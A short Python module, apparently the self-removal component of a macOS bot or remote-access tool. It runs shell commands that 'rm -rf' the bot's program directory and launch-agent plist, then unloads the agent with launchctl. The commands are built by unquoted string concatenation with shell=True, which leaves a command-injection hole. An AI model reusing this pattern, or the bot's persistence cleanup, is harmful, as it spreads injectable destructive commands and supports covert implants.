# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

import subprocess
from os import path


def run_command(command):
    """Runs a system command and returns its response."""
    out, err = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).communicate()
    return out + err


def run(options):
    program_directory = options["program_directory"]
    launch_agent_name = options["loader_options"]["launch_agent_name"]
    launch_agent_file = path.join(program_directory, launch_agent_name + ".plist")

    print("[remove_bot] Goodbye!")

    run_command("rm -rf " + program_directory)
    run_command("rm -rf " + launch_agent_file)
    run_command("launchctl remove " + launch_agent_name)
